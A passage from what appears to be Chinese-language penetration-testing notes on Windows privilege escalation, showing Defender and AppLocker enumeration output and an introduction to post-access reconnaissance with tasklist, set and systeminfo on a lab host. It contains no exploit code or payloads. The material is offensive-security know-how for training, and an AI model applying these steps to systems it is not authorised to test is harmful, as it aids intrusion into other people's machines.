True</span><br><span class="line">AntispywareSignatureAge         : <span class="number">1</span></span><br><span class="line">AntispywareSignatureLastUpdated : <span class="number">3</span>/<span class="number">28</span>/<span class="number">2021</span> <span class="number">2</span>:<span class="number">59</span>:<span class="number">13</span> AM</span><br><span class="line">AntispywareSignatureVersion     : <span class="number">1.333</span>.<span class="number">1470.0</span></span><br><span class="line">AntivirusEnabled                : True</span><br><span class="line">AntivirusSignatureAge           : <span class="number">1</span></span><br><span class="line">AntivirusSignatureLastUpdated   : <span class="number">3</span>/<span class="number">28</span>/<span class="number">2021</span> <span class="number">2</span>:<span class="number">59</span>:<span class="number">12</span> AM</span><br><span class="line">AntivirusSignatureVersion       : <span class="number">1.333</span>.<span class="number">1470.0</span></span><br><span class="line">BehaviorMonitorEnabled          : False</span><br><span class="line">ComputerID                      : <span class="number">54</span>AF7DE4<span class="literal">-3C7E-4DA0-87AC-831B045B9063</span></span><br><span class="line">ComputerState                   : <span class="number">0</span></span><br><span class="line">FullScanAge                     : <span class="number">4294967295</span></span><br><span class="line">FullScanEndTime                 :</span><br><span class="line">FullScanStartTime               :</span><br><span class="line">IoavProtectionEnabled           : False</span><br><span class="line">LastFullScanSource              : <span class="number">0</span></span><br><span class="line">LastQuickScanSource             : <span class="number">0</span></span><br><span class="line">NISEnabled                      : False</span><br><span class="line">NISEngineVersion                : <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line">NISSignatureAge                 : <span class="number">4294967295</span></span><br><span class="line">NISSignatureLastUpdated         :</span><br><span class="line">NISSignatureVersion             : <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line">OnAccessProtectionEnabled       : False</span><br><span class="line">QuickScanAge                    : <span class="number">4294967295</span></span><br><span class="line">QuickScanEndTime                :</span><br><span class="line">QuickScanStartTime              :</span><br><span class="line">RealTimeProtectionEnabled       : False</span><br><span class="line">RealTimeScanDirection           : <span class="number">0</span></span><br><span class="line">PSComputerName                  :</span><br></pre></td></tr></table></figure>

<h2 id="AppLocker"><a href="#AppLocker" class="headerlink" title="AppLocker"></a>AppLocker</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-AppLockerPolicy</span> <span class="literal">-Effective</span> | <span class="built_in">select</span> <span class="literal">-ExpandProperty</span> RuleCollections</span><br><span class="line"></span><br><span class="line">PublisherConditions : &#123;*\*\*,<span class="number">0.0</span>.<span class="number">0.0</span>-*&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : a9e18c21<span class="literal">-ff8f-43cf-b9fc-db40eed693ba</span></span><br><span class="line">Name                : (Default Rule) All signed packaged apps</span><br><span class="line">Description         : Allows members of the Everyone <span class="built_in">group</span> to run packaged apps that are signed.</span><br><span class="line">UserOrGroupSid      : S<span class="literal">-1-1-0</span></span><br><span class="line">Action              : Allow</span><br><span class="line"></span><br><span class="line">PathConditions      : &#123;%PROGRAMFILES%\*&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : <span class="number">921</span>cc481<span class="literal">-6e17-4653-8f75-050b80acca20</span></span><br><span class="line">Name                : (Default Rule) All files located <span class="keyword">in</span> the Program Files folder</span><br><span class="line">Description         : Allows members of the Everyone <span class="built_in">group</span> to run applications that are located <span class="keyword">in</span> the Program Files</span><br><span class="line">                      folder.</span><br><span class="line">UserOrGroupSid      : S<span class="literal">-1-1-0</span></span><br><span class="line">Action              : Allow</span><br><span class="line"></span><br><span class="line">PathConditions      : &#123;%WINDIR%\*&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : a61c8b2c<span class="literal">-a319-4cd0-9690-d2177cad7b51</span></span><br><span class="line">Name                : (Default Rule) All files located <span class="keyword">in</span> the Windows folder</span><br><span class="line">Description         : Allows members of the Everyone <span class="built_in">group</span> to run applications that are located <span class="keyword">in</span> the Windows folder.</span><br><span class="line">UserOrGroupSid      : S<span class="literal">-1-1-0</span></span><br><span class="line">Action              : Allow</span><br><span class="line"></span><br><span class="line">PathConditions      : &#123;*&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : fd686d83<span class="literal">-a829-4351-8ff4-27c7de5755d2</span></span><br><span class="line">Name                : (Default Rule) All files</span><br><span class="line">Description         : Allows members of the local Administrators <span class="built_in">group</span> to run all applications.</span><br><span class="line">UserOrGroupSid      : S<span class="literal">-1-5-32-544</span></span><br><span class="line">Action              : Allow</span><br><span class="line"></span><br><span class="line">PublisherConditions : &#123;*\*\*,<span class="number">0.0</span>.<span class="number">0.0</span>-*&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : b7af7102<span class="literal">-efde-4369-8a89-7a6a392d1473</span></span><br><span class="line">Name                : (Default Rule) All digitally signed Windows Installer files</span><br><span class="line">Description         : Allows members of the Everyone <span class="built_in">group</span> to run digitally signed Windows Installer files.</span><br><span class="line">UserOrGroupSid      : S<span class="literal">-1-1-0</span></span><br><span class="line">Action              : Allow</span><br><span class="line"></span><br><span class="line">PathConditions      : &#123;%WINDIR%\Installer\*&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : <span class="number">5</span>b290184<span class="literal">-345a-4453-b184-45305f6d9a54</span></span><br><span class="line">Name                : (Default Rule) All Windows Installer files <span class="keyword">in</span> %systemdrive%\Windows\Installer</span><br><span class="line">Description         : Allows members of the Everyone <span class="built_in">group</span> to run all Windows Installer files located <span class="keyword">in</span></span><br><span class="line">                      %systemdrive%\Windows\Installer.</span><br><span class="line">UserOrGroupSid      : S<span class="literal">-1-1-0</span></span><br><span class="line">Action              : Allow</span><br><span class="line"></span><br><span class="line">PathConditions      : &#123;*.*&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : <span class="number">64</span>ad46ff<span class="literal">-0d71-4fa0-a30b-3f3d30c5433d</span></span><br><span class="line">Name                : (Default Rule) All Windows Installer files</span><br><span class="line">Description         : Allows members of the local Administrators <span class="built_in">group</span> to run all Windows Installer files.</span><br><span class="line">UserOrGroupSid      : S<span class="literal">-1-5-32-544</span></span><br><span class="line">Action              : Allow</span><br><span class="line"></span><br><span class="line">PathConditions      : &#123;%PROGRAMFILES%\*&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : <span class="number">06</span>dce67b<span class="literal">-934c-454f-a263-2515c8796a5d</span></span><br><span class="line">Name                : (Default Rule) All scripts located <span class="keyword">in</span> the Program Files folder</span><br><span class="line">Description         : Allows members of the Everyone <span class="built_in">group</span> to run scripts that are located <span class="keyword">in</span> the Program Files folder.</span><br><span class="line">UserOrGroupSid      : S<span class="literal">-1-1-0</span></span><br><span class="line">Action              : Allow</span><br><span class="line"></span><br><span class="line">PathConditions      : &#123;%WINDIR%\*&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : <span class="number">9428</span>c672<span class="literal">-5fc3-47f4-808a-a0011f36dd2c</span></span><br><span class="line">Name                : (Default Rule) All scripts located <span class="keyword">in</span> the Windows folder</span><br><span class="line">Description         : Allows members of the Everyone <span class="built_in">group</span> to run scripts that are located <span class="keyword">in</span> the Windows folder.</span><br><span class="line">UserOrGroupSid      : S<span class="literal">-1-1-0</span></span><br><span class="line">Action              : Allow</span><br><span class="line"></span><br><span class="line">PathConditions      : &#123;*&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : ed97d0cb<span class="literal">-15ff-430f-b82c-8d7832957725</span></span><br><span class="line">Name                : (Default Rule) All scripts</span><br><span class="line">Description         : Allows members of the local Administrators <span class="built_in">group</span> to run all scripts.</span><br><span class="line">UserOrGroupSid      : S<span class="literal">-1-5-32-544</span></span><br><span class="line">Action              : Allow</span><br></pre></td></tr></table></figure>

<h2 id="Test-AppLockerPolicy"><a href="#Test-AppLockerPolicy" class="headerlink" title="Test-AppLockerPolicy"></a>Test-AppLockerPolicy</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-AppLockerPolicy</span> <span class="literal">-Local</span> | <span class="built_in">Test-AppLockerPolicy</span> <span class="literal">-path</span> C:\Windows\System32\cmd.exe <span class="literal">-User</span> Everyone</span><br><span class="line"></span><br><span class="line">FilePath                    PolicyDecision MatchingRule</span><br><span class="line"><span class="literal">--------</span>                    <span class="literal">--------------</span> <span class="literal">------------</span></span><br><span class="line">C:\Windows\System32\cmd.exe         Denied c:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h1><p>在评估期间，可能会在 Windows 主机（无论是否加入域）上获得低权限 shell，并且需要执行权限提升才能进一步获得访问权限。完全攻陷主机可能会让获得敏感文件&#x2F;文件共享的访问权限，授予捕获流量以获取更多凭据的能力，或者获取可帮助进一步获得访问权限甚至直接提升到 Active Directory 环境中的域管理员的凭据。根据系统配置和遇到的数据类型将权限提升到以下之一：</p>
<table>
<thead>
<tr>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>高权限<code>NT AUTHORITY\SYSTEM</code>帐户或<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account">LocalSystem</a>帐户，它是一种比本地管理员帐户具有更多权限的高权限帐户，用于运行大多数 Windows 服务。</td>
</tr>
<tr>
<td>内置本地<code>administrator</code>帐户。有些组织会禁用此帐户，但很多组织不会禁用。在客户端环境中，跨多个系统重复使用此帐户的情况并不罕见。</td>
</tr>
<tr>
<td>另一个属于本地<code>Administrators</code>组成员的本地帐户。此组中的任何帐户都将具有与内置<code>administrator</code>帐户相同的权限。</td>
</tr>
<tr>
<td>属于本地<code>Administrators</code>组的标准（非特权）域用户。</td>
</tr>
<tr>
<td>属于本地<code>Administrators</code>组的域管理员（在 Active Directory 环境中拥有高度特权）。</td>
</tr>
</tbody></table>
<p><strong>关键数据</strong></p>
<p><code>OS name</code>：了解 Windows 操作系统的类型（工作站或服务器）和级别（Windows 7 或 10、Server 2008、2012、2016、2019 等）将使了解可能可用的工具类型（例如<code>PowerShell</code>旧版系统上的版本或缺少的版本）。这还可以识别可能存在公开漏洞的操作系统版本。。</p>
<p><code>Version</code>：与操作系统<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Comparison_of_Microsoft_Windows_versions">版本</a>一样，可能存在针对特定 Windows 版本漏洞的公开漏洞。Windows 系统漏洞可能会导致系统不稳定甚至完全崩溃。在任何生产系统上运行这些漏洞时都要小心谨慎，并确保在运行漏洞之前完全了解漏洞及其可能造成的后果。</p>
<p><code>Running Services</code>：了解主机上运行的服务非常重要，尤其是以<code>NT AUTHORITY\SYSTEM</code>管理员级别帐户运行的服务。在特权帐户上下文中运行的配置错误或存在漏洞的服务很容易被特权提升。</p>
<h2 id="System-Information"><a href="#System-Information" class="headerlink" title="System Information"></a>System Information</h2><p>查看系统本身可以让更好地了解确切的操作系统版本、正在使用的硬件、已安装的程序和安全更新。这将帮助缩小寻找任何可能利用来提升权限的缺失补丁和相关 CVE 的范围。</p>
<p> <code>tasklist</code> 查看正在运行的可执行文件</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">tasklist</span> /<span class="title">svc</span></span></span><br><span class="line"><span class="function"># <span class="title">tasklist</span> /<span class="title">svc</span> /<span class="title">fi</span> &quot;<span class="title">PID</span> <span class="title">eq</span> 1234&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Image</span> <span class="title">Name</span>                     <span class="title">PID</span> <span class="title">Services</span></span></span><br><span class="line"><span class="function">========================= ======== ============================================</span></span><br><span class="line"><span class="function"><span class="title">System</span> <span class="title">Idle</span> <span class="title">Process</span>              0 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">System</span>                           4 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">smss.exe</span>                       316 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">csrss.exe</span>                      424 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">wininit.exe</span>                    528 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">csrss.exe</span>                      540 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">winlogon.exe</span>                   612 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">services.exe</span>                   664 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">lsass.exe</span>                      672 <span class="title">KeyIso</span>, <span class="title">SamSs</span>, <span class="title">VaultSvc</span></span></span><br><span class="line"><span class="function"><span class="title">svchost.exe</span>                    776 <span class="title">BrokerInfrastructure</span>, <span class="title">DcomLaunch</span>, <span class="title">LSM</span>,</span></span><br><span class="line"><span class="function">                                   <span class="title">PlugPlay</span>, <span class="title">Power</span>, <span class="title">SystemEventsBroker</span></span></span><br><span class="line"><span class="function"><span class="title">svchost.exe</span>                    836 <span class="title">RpcEptMapper</span>, <span class="title">RpcSs</span></span></span><br><span class="line"><span class="function"><span class="title">LogonUI.exe</span>                    952 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">dwm.exe</span>                        964 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">svchost.exe</span>                    972 <span class="title">TermService</span></span></span><br><span class="line"><span class="function"><span class="title">svchost.exe</span>                   1008 <span class="title">Dhcp</span>, <span class="title">EventLog</span>, <span class="title">lmhosts</span>, <span class="title">TimeBrokerSvc</span></span></span><br><span class="line"><span class="function"><span class="title">svchost.exe</span>                    364 <span class="title">NcbService</span>, <span class="title">PcaSvc</span>, <span class="title">ScDeviceEnum</span>, <span class="title">TrkWks</span>,</span></span><br><span class="line"><span class="function">                                   <span class="title">UALSVC</span>, <span class="title">UmRdpService</span></span></span><br><span class="line"><span class="function">&lt;...<span class="title">SNIP</span>...&gt;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">FileZilla</span> <span class="title">Server</span> <span class="title">Interfac</span>     5628 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">jusched.exe</span>                   5796 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">cmd.exe</span>                       4132 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">conhost.exe</span>                   4136 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">TrustedInstaller.exe</span>          1120 <span class="title">TrustedInstaller</span></span></span><br><span class="line"><span class="function"><span class="title">TiWorker.exe</span>                  1816 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">WmiApSrv.exe</span>                  2428 <span class="title">wmiApSrv</span></span></span><br><span class="line"><span class="function"><span class="title">tasklist.exe</span>                  3596 <span class="title">N</span>/<span class="title">A</span></span></span><br></pre></td></tr></table></figure>

<h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><p>环境变量可以解释很多有关主机配置的信息。</p>
<p><code>set</code> 打印出环境变量</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">set</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">ALLUSERSPROFILE</span>=<span class="title">C</span>:\<span class="title">ProgramData</span></span></span><br><span class="line"><span class="function"><span class="title">APPDATA</span>=<span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Administrator</span>\<span class="title">AppData</span>\<span class="title">Roaming</span></span></span><br><span class="line"><span class="function"><span class="title">CommonProgramFiles</span>=<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Common</span> <span class="title">Files</span></span></span><br><span class="line"><span class="function"><span class="title">CommonProgramFiles</span>(<span class="title">x86</span>)=<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)\<span class="title">Common</span> <span class="title">Files</span></span></span><br><span class="line"><span class="function"><span class="title">CommonProgramW6432</span>=<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Common</span> <span class="title">Files</span></span></span><br><span class="line"><span class="function"><span class="title">COMPUTERNAME</span>=<span class="title">WINLPE</span>-<span class="title">SRV01</span></span></span><br><span class="line"><span class="function"><span class="title">ComSpec</span>=<span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span>\<span class="title">cmd.exe</span></span></span><br><span class="line"><span class="function"><span class="title">HOMEDRIVE</span>=<span class="title">C</span>:</span></span><br><span class="line"><span class="function"><span class="title">HOMEPATH</span>=\<span class="title">Users</span>\<span class="title">Administrator</span></span></span><br><span class="line"><span class="function"><span class="title">LOCALAPPDATA</span>=<span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Administrator</span>\<span class="title">AppData</span>\<span class="title">Local</span></span></span><br><span class="line"><span class="function"><span class="title">LOGONSERVER</span>=\\<span class="title">WINLPE</span>-<span class="title">SRV01</span></span></span><br><span class="line"><span class="function"><span class="title">NUMBER_OF_PROCESSORS</span>=6</span></span><br><span class="line"><span class="function"><span class="title">OS</span>=<span class="title">Windows_NT</span></span></span><br><span class="line"><span class="function"><span class="title">Path</span>=<span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span>;<span class="title">C</span>:\<span class="title">Windows</span>;<span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">System32</span>\<span class="title">Wbem</span>;<span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">System32</span>\<span class="title">WindowsPowerShell</span>\<span class="title">v1</span>.0\;<span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Administrator</span>\<span class="title">AppData</span>\<span class="title">Local</span>\<span class="title">Microsoft</span>\<span class="title">WindowsApps</span>;</span></span><br><span class="line"><span class="function"><span class="title">PATHEXT</span>=.<span class="title">COM</span>;.<span class="title">EXE</span>;.<span class="title">BAT</span>;.<span class="title">CMD</span>;.<span class="title">VBS</span>;.<span class="title">VBE</span>;.<span class="title">JS</span>;.<span class="title">JSE</span>;.<span class="title">WSF</span>;.<span class="title">WSH</span>;.<span class="title">MSC</span></span></span><br><span class="line"><span class="function"><span class="title">PROCESSOR_ARCHITECTURE</span>=<span class="title">AMD64</span></span></span><br><span class="line"><span class="function"><span class="title">PROCESSOR_IDENTIFIER</span>=<span class="title">AMD64</span> <span class="title">Family</span> 23 <span class="title">Model</span> 49 <span class="title">Stepping</span> 0, <span class="title">AuthenticAMD</span></span></span><br><span class="line"><span class="function"><span class="title">PROCESSOR_LEVEL</span>=23</span></span><br><span class="line"><span class="function"><span class="title">PROCESSOR_REVISION</span>=3100</span></span><br><span class="line"><span class="function"><span class="title">ProgramData</span>=<span class="title">C</span>:\<span class="title">ProgramData</span></span></span><br><span class="line"><span class="function"><span class="title">ProgramFiles</span>=<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span></span></span><br><span class="line"><span class="function"><span class="title">ProgramFiles</span>(<span class="title">x86</span>)=<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)</span></span><br><span class="line"><span class="function"><span class="title">ProgramW6432</span>=<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span></span></span><br><span class="line"><span class="function"><span class="title">PROMPT</span>=$<span class="title">P</span>$<span class="title">G</span></span></span><br><span class="line"><span class="function"><span class="title">PSModulePath</span>=<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">WindowsPowerShell</span>\<span class="title">Modules</span>;<span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span>\<span class="title">WindowsPowerShell</span>\<span class="title">v1</span>.0\<span class="title">Modules</span></span></span><br><span class="line"><span class="function"><span class="title">PUBLIC</span>=<span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Public</span></span></span><br><span class="line"><span class="function"><span class="title">SESSIONNAME</span>=<span class="title">Console</span></span></span><br><span class="line"><span class="function"><span class="title">SystemDrive</span>=<span class="title">C</span>:</span></span><br><span class="line"><span class="function"><span class="title">SystemRoot</span>=<span class="title">C</span>:\<span class="title">Windows</span></span></span><br><span class="line"><span class="function"><span class="title">TEMP</span>=<span class="title">C</span>:\<span class="title">Users</span>\<span class="title">ADMINI</span>~1\<span class="title">AppData</span>\<span class="title">Local</span>\<span class="title">Temp</span>\1</span></span><br><span class="line"><span class="function"><span class="title">TMP</span>=<span class="title">C</span>:\<span class="title">Users</span>\<span class="title">ADMINI</span>~1\<span class="title">AppData</span>\<span class="title">Local</span>\<span class="title">Temp</span>\1</span></span><br><span class="line"><span class="function"><span class="title">USERDOMAIN</span>=<span class="title">WINLPE</span>-<span class="title">SRV01</span></span></span><br><span class="line"><span class="function"><span class="title">USERDOMAIN_ROAMINGPROFILE</span>=<span class="title">WINLPE</span>-<span class="title">SRV01</span></span></span><br><span class="line"><span class="function"><span class="title">USERNAME</span>=<span class="title">Administrator</span></span></span><br><span class="line"><span class="function"><span class="title">USERPROFILE</span>=<span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Administrator</span></span></span><br><span class="line"><span class="function"><span class="title">windir</span>=<span class="title">C</span>:\<span class="title">Windows</span> </span></span><br></pre></td></tr></table></figure>

<h3 id="配置信息"><a href="#配置信息" class="headerlink" title="配置信息"></a>配置信息</h3><p><code>systeminfo</code> 打印系统信息</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">systeminfo</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Host</span> <span class="title">Name</span>:                 <span class="title">WINLPE</span>-<span class="title">SRV01</span></span></span><br><span class="line"><span class="function"><span class="title">OS</span> <span class="title">Name</span>:                   <span class="title">Microsoft</span> <span class="title">Windows</span> <span class="title">Server</span> 2016 <span class="title">Standard</span></span></span><br><span class="line"><span class="function"><span class="title">OS</span> <span class="title">Version</span>:                10.0.14393 <span class="title">N</span>/<span class="title">A</span> <span class="title">Build</span> 14393</span></span><br><span class="line"><span class="function"><span class="title">OS</span> <span class="title">Manufacturer</span>:           <span class="title">Microsoft</span> <span class="title">Corporation</span></span></span><br><span class="line"><span class="function"><span class="title">OS</span> <span class="title">Configuration</span>:          <span class="title">Standalone</span> <span class="title">Server</span></span></span><br><span class="line"><span class="function"><span class="title">OS</span> <span class="title">Build</span> <span class="title">Type</span>:             <span class="title">Multiprocessor</span> <span class="title">Free</span></span></span><br><span class="line"><span class="function"><span class="title">Registered</span> <span class="title">Owner</span>:          <span class="title">Windows</span> <span class="title">User</span></span></span><br><span class="line"><span class="function"><span class="title">Registered</span> <span class="title">Organization</span>:</span></span><br><span class="line"><span class="function"><span class="title">Product</span> <span class="title">ID</span>:                00376-30000-00299-<span class="title">AA303</span></span></span><br><span class="line"><span class="function"><span class="title">Original</span> <span class="title">Install</span> <span class="title">Date</span>:     3/24/2021, 3:46:32 <span class="title">PM</span></span></span><br><span class="line"><span class="function"><span class="title">System</span> <span class="title">Boot</span> <span class="title">Time</span>:         